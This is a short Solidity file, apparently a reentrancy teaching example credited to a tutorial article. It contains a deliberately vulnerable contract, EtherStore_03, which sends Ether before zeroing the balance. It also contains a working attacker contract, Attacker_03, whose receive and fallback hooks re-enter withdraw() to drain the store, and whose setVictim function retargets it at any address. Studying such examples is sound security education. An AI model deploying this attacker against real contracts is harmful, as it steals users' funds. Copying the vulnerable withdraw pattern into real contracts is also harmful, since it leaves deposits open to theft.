//inspired https://zenn.dev/yuki2020/articles/24e68f806d3322
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EtherStore_03 {
    mapping(address => uint) public balances;
 
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
 
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
 
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
 
        balances[msg.sender] = 0;
    }
 
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function queryCredit(address to) public view returns (uint) {
        return balances[to];
    }

}


contract Attacker_03 {
    EtherStore_03 public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore_03(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    receive() external payable {
    if (address(etherStore).balance >= 1 ether) {
        etherStore.withdraw();
    }
}

    function attack() external payable {
        require(msg.value >= 1 ether, "xxxxxxxxxx");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function setVictim(address addr) public {
        etherStore = EtherStore_03(addr);
    }
}
